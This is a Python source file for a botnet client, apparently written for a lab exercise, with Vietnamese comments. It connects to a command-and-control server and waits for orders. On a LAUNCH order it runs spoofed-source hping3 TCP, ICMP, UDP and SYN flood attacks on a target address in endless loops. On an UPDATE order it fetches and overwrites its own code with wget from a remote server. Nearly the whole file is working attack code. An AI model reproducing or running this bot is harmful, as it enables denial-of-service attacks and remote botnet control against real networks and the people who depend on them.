import socket
import time
import threading
import subprocess
import os
import signal

class launchAttack:
    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self, choice, target, attacker, port):
        if choice == "1":
            print("Thực hiện TCP Flood...")
            while self._running:
                subprocess.Popen(f'sudo hping3 -S --flood -p {port} {target}', shell=True, preexec_fn=os.setsid)

        elif choice == "2":
            print("Thực hiện Hping3 ICMP Flood...")
            while self._running:
                subprocess.Popen(f'sudo hping3 -1 --flood --spoof {attacker} {target}', shell=True, preexec_fn=os.setsid)

        elif choice == "3":
            print("Thực hiện Hping3 UDP Flood...")
            while self._running:
                subprocess.Popen(f'sudo hping3 -2 --flood --spoof {attacker} {target}', shell=True, preexec_fn=os.setsid)

        elif choice == "4":
            print("Thực hiện Hping3 SYN Flood...")
            while self._running:
                subprocess.Popen(f'sudo hping3 --flood -d 65000 --frag --spoof {attacker} -p {port} -S {target}', shell=True, preexec_fn=os.setsid)

        else:
            print("Lựa chọn không hợp lệ!")

def Main():
    global attackSet
    attackSet = 0

    host = '172.20.10.2'  # NetBot CCC Server
    port = 5555  # NetBot CCC Port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Lập trình socket TCP Connection
    try:
        s.connect((host, port))  # Connect to the CCC Server
        message = "HEARTBEAT"  
    except:
        print("CCC Server not online. Retrying every 15 seconds...")
        time.sleep(15)
        Main()
        
    while True:
        # Gửi tín hiệu đến server
        try:
            s.send(message.encode())
        except:
            Main()

        # Nhận tín hiệu đến server
        data = s.recv(1024)
        data = str(data.decode()).split('_')
        
        if len(data) > 1:
            attStatus = data[2]
        else:
            attStatus = "OFFLINE"
        
        print('CCC Response: ', attStatus)

        if attStatus == "LAUNCH":
            if attackSet == 0:
                # Hiển thị menu tấn công chỉ khi nhận được lệnh LAUNCH
                # Kiểu tấn công: sử dụng thư viện Hping3
                print("Chọn kiểu tấn công:")
                print("1. Hping3 TCP Flood")
                print("2. Hping3 ICMP Flood")
                print("3. Hping3 UDP Flood")
                print("4. Hping3 SYN Flood")
                # Có thể gọi luôn phương thức tấn công từ máy chủ, mà không cần nhập các lựa chọn.
                # Việc nhập thêm các lựa chọn trong máy netbot trong bài thí nghiệm nhằm mục đích kiểm soát các máy bot khi tấn công một cách độc lập
                # Đảm bảo các máy có thể tự dừng tấn công độc lập dễ dàng fix lỗi mà không cần dừng cả máy chủ để sửa.
                choice = input("Nhập lựa chọn (1/2/3/4): ")
                attackSet = 1  # Đặt trạng thái tấn công

                target = "172.20.10.3"  # Địa chỉ IP mục tiêu
                attacker = "192.168.1.2"  # Địa chỉ IP giả mạo (spoofed) có thể đặt các tên IP các máy netbot khác nhau, dùng wireshark để kiểm tra
                # netbot đó có tấn công đến máy nạn nhân hay không.

                # Gọi phương thức để tấn công.
                c = launchAttack()
                t = threading.Thread(target=c.run, args=(choice, target, attacker, port))
                t.start()

            else:
                print('Attack in Progress...')
                time.sleep(15)

        elif attStatus == "HALT":
            attackSet = 0
            time.sleep(30)
            continue
        elif attStatus == "HOLD":
            attackSet = 0
            print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
            time.sleep(30)
        elif attStatus == "UPDATE":
            # Có thể UPDATE lại toàn bộ các máy netbot từ máy chủ bằng vieejxc chuyển status sang Update
            # Nhớ phải chạy http.server ở máy chủ thì mới thành công. 
            os.system('wget -N http://172.10.20.2:8080/netbot/netbot_config.py -O netbot_config.py > /dev/null 2>&1')
            print('Client Libraries Updated')
            time.sleep(30)
        else:
            print('Command Server Offline. Retrying in 30 seconds...')
            time.sleep(30)

    # close the connection
    s.close()

if __name__ == '__main__':
    Main()
